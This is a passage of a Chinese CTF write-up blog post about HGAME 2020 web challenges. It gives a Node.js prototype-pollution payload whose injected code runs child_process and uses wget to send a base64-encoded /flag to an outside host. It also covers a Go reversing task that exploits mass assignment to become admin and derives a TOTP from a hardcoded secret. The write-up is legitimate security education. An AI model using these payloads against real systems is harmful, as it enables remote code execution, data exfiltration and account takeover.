(sekiro.posture == 500 || sekiro.health == 0) &#123;</span><br><span class="line">           sekiro.alive = false</span><br><span class="line">       &#125;</span><br><span class="line">       return sekiro</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到这里<code>sekiro.attackInfo.additionalEffect</code>直接插入方法的执行中，这就造成了RCE。那就要去污染这个sekiro</p>
+<p>不过由于action会先检查session中是否有sekiro，有再去接收传入的值，没有则通过info控制器设置session</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">router.get(&apos;/info&apos;, function (req, res) &#123;</span><br><span class="line">  if (typeof(req.query.restart) != &quot;undefined&quot; || !req.session.sekiro) &#123;</span><br><span class="line">    req.session.sekiro = &#123; &quot;health&quot;: 3000, posture: 0, alive: true &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.json(req.session.sekiro);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>由于对象中若设置了一个属性，去获取时就不会再去查原型链中的属性。info中给session设置了sekiro，那就不会再往原型链上找sekiro属性。解决办法也很简单，先污染了原型链，再新启用一个session，由于新启用的session中没有sekiro，就会往原型链上找，而原型链中有就能够通过action中的检查。于是payload就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;solution&quot;:&quot;kotori&quot;,&quot;__proto__&quot;:&#123;&quot;sekiro&quot;:&#123;&quot;health&quot;:3000,&quot;posture&quot;:0,&quot;alive&quot;:true,&quot;attackInfo&quot;:&#123;&quot;method&quot;:&quot;xxx&quot;,&quot;attack&quot;:1000,&quot;solution&quot;:&quot;kotori&quot;,&quot;additionalEffect&quot;:&quot;global.process.mainModule.constructor._load(&apos;child_process&apos;).exec(`wget http://ip/?$(cat /flag|base64)`, function()&#123;&#125;);&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>但实际操作后却报错，报了栈溢出的错误，测了下发现是<code>merge()</code>出了问题。调试+想了很久才想明白，因为这里污染了原型链是对于所有的对象的，而这里设置的sekiro也是对象。污染之后<code>req.body</code>中会带有sekiro键。传入clone再传入merge后，merge判断sekiro为对象然后递归，但sekiro中又有一个sekiro，于是又递归。这部不就是无限套娃吗？！不溢出才怪<br>既然知道了原因，解决起来也很简单，既然<code>req.body</code>中自带sekiro，那就通过传入值将其覆盖掉为非对象，这样就不会无限递归了</p>
+<p>于是操作一波</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/b19fcaacbd322caa1e84514a6679080c.png" alt=""></p>
+<p>获得session</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/72810f7fbd7dc336a236c7b4023f397d.png" alt=""></p>
+<p>污染原型链</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/6f901a126771038d88b6a56c2dbc8af9.png" alt=""></p>
+<p>换个session再次访问<br><code>{&quot;solution&quot;:&quot;umi&quot;,&quot;sekiro&quot;:1}</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/408144d09bd3740cdfd435f8ec44b4a6.png" alt=""></p>
+<p>得到弹回来的flag</p>
+<p>可惜没看比赛结束的时间，本来以为周五晚才结束，没想到周四晚就结束了，晚了几个小时才整出来Orz</p>
+<p>看了出的官方wp后，才知道还有从<code>sekiro</code>从抽出的<code>attackinfo</code>中不含<code>additionalEffect</code>时直接污染原型链的<code>additionalEffect</code>的方法，还是太菜了</p>
+<h2 id="Re-Go"><a href="#Re-Go" class="headerlink" title="Re:Go"></a>Re:Go</h2><p>Go逆向，web手开始自闭</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/62a7b9048e298b24afd98bcc7dc191d1.png" alt=""></p>
+<p>用IDA打开后全是这种无意义的函数名，这里需要恢复符号表<br>这里用到IDAGolangHelper这个插件<br><a href="https://github.com/sibears/IDAGolangHelper" target="_blank" rel="noopener">IDAGolangHelper</a><br>通过文件&gt;脚本文件打开<code>go_entry.py</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/199d38bb0076d8881cf707a16f9ab62d.png" alt=""></p>
+<p>然后选择go版本，点<code>rename functions</code>，再点ok就可以。这里用的是1.2版本去处理<br>还有，如果用的不是<code>IDA7.4</code>版本，需要修改一下<code>__init__.py</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/bb01c02d40617792e8e3be3ef90e2c41.png" alt=""></p>
+<p>经过处理后函数名就有意义了</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/6d53d7cc66ac03c685b5a6feaf2dfdd2.png" alt=""></p>
+<p>然后回去看页面，首先登录注册就有点坑，为啥是邮箱？用用户名一直登不上去还以为环境出问题了。进入后getFlag需要admin账号</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/1064457b2a0865eb70f79f2aa7b8574c.png" alt=""></p>
+<p>另一个页面可以修改密码，感觉可能要注入，于是回IDA中看看要怎么处理<br>进到<code>Service_UpdateProfile</code>函数里…完全看不懂，如果是源码的话就是这里</p>
+<p><code>s.DB.Model(&amp;User{}).Where(&amp;User{Model: gorm.Model{ID: uid.(uint)}}).Update(&amp;user).RowsAffected</code></p>
+<p>这里用了Context中的uid去寻找对应用户，这个uid是用户的id，在登录时设置入Context</p>
+<p><code>err := c.ShouldBindJSON(&amp;user)</code></p>
+<p>而处理传入的json时并没用检查里面是否只有password和mail，于是导致可以传入name直接修改用户名。也就是能直接修改json带有<code>&quot;name&quot;:&quot;admin&quot;</code>就可以把用户名改成admin，直接成为admin账号<br>直接读逆向出的伪代码就真的看不出user绑定，先留着坑吧（太菜了</p>
+<p>不过整这个的时候由于是https，burpsuite一直没配于是想通过firefox控制台发送，但发现一直502，不改数据发倒没问题，感觉是https的原因。于是还是去配了burpsuite，但证书一直导不入（新版firefox的原因），整了好久，下了一个新版bp里的证书才能用<br>然后抓包修改</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/0a8a503f86e70b5e9c1ce8df3c7f5558.png" alt=""></p>
+<p>刷新一下用户名已经变了</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/15873bc40e4b2792e05eb68ff6231ed2.png" alt=""></p>
+<p>然后再去看一下<code>/flag</code>的逻辑</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/357dabb63c7d355530c6c6ba19232501.png" alt=""></p>
+<p>往下寻找后可以看到，这里用了<code>github_com_xlzd_gotp__ptr_TOTP_Now()</code>，totp？跟进去看一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/98d86bad89be3c88f9f3adaa196eb00b.png" alt=""></p>
+<p>可以看到有一系列处理otp的函数，既然带有github前缀那可能在github上有开源，于是去看看<br><a href="github.com/xlzd/gotp">Golang OTP</a><br>确实是一个OTP验证，那需要找找哪有密钥<br>看了一下并没有用算法去生成密钥，估计是直接传入的，那就只有这里</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/0c083281aa7f60c94ed5eb4bc3b9014a.png" alt=""></p>
+<p>不过OTP的密钥只有16位，于是取前16位尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;github.com/xlzd/gotp&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	fmt.Println(&quot;Current OTP is&quot;, gotp.NewDefaultTOTP(&quot;X5JMTFGT4FVJ34GV&quot;).Now())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>go run otp.go</code><br>获得密码，快速ctrl c+v发送得到flag（主要是我不会写go的发包）</p>
+<p><img src="http://shifeng-kaze.cn/blog/hgame2020_web_wp/42ff591eda1ad00f68c0affdd3532517.png" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/18/byteCTF2019-web-wp/" rel="next" title="byteCTF2019-web-wp">
+                <i class="fa fa-chevron-left"></i> byteCTF2019-web-wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://shifeng-kaze.cn/blog/head/kotori.jpg" alt="k0t0r1">
+            
+              <p class="site-author-name" itemprop="name">k0t0r1</p>
+              <p class="site-description motion-element" itemprop="description">～いらっしゃいません～</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://shifeng-kaze.cn/" title="shifeng-kaze" target="_blank">shifeng-kaze</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aluvion.github.io" title="Aluvion" target="_blank">Aluvion</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Week1"><span class="nav-number">1.</span> <span class="nav-text">Week1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Cosmos-的博客"><span class="nav-number">1.1.</span> <span class="nav-text">Cosmos 的博客</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#接-头-霸-王"><span class="nav-number">1.2.</span> <span class="nav-text">接 头 霸 王</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-World"><span class="nav-number">1.3.</span> <span class="nav-text">Code World</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#鸡尼泰玫"><span class="nav-number">1.4.</span> <span class="nav-text">鸡尼泰玫</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week2"><span class="nav-number">2.</span> <span class="nav-text">Week2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Cosmos的博客后台"><span class="nav-number">2.1.</span> <span class="nav-text">Cosmos的博客后台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cosmos的留言板-1"><span class="nav-number">2.2.</span> <span class="nav-text">Cosmos的留言板-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cosmos的新语言"><span class="nav-number">2.3.</span> <span class="nav-text">Cosmos的新语言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#跑一波拿到flag"><span class="nav-number">2.4.</span> <span class="nav-text">跑一波拿到flag</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week3"><span class="nav-number">3.</span> <span class="nav-text">Week3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#序列之争-Ordinal-Scale"><span class="nav-number">3.1.</span> <span class="nav-text">序列之争 - Ordinal Scale</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二发入魂！"><span class="nav-number">3.2.</span> <span class="nav-text">二发入魂！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cosmos的二手市场"><span class="nav-number">3.3.</span> <span class="nav-text">Cosmos的二手市场</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cosmos的留言板-2"><span class="nav-number">3.4.</span> <span class="nav-text">Cosmos的留言板-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cosmos的聊天室2-0"><span class="nav-number">3.5.</span> <span class="nav-text">Cosmos的聊天室2.0</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week4"><span class="nav-number">4.</span> <span class="nav-text">Week4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#代打出题人服务中心"><span class="nav-number">4.1.</span> <span class="nav-text">代打出题人服务中心</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezJava"><span class="nav-number">4.2.</span> <span class="nav-text">ezJava</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sekiro"><span class="nav-number">4.3.</span> <span class="nav-text">sekiro</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re-Go"><span class="nav-number">4.4.</span> <span class="nav-text">Re:Go</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">k0t0r1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+</body>
+</html>
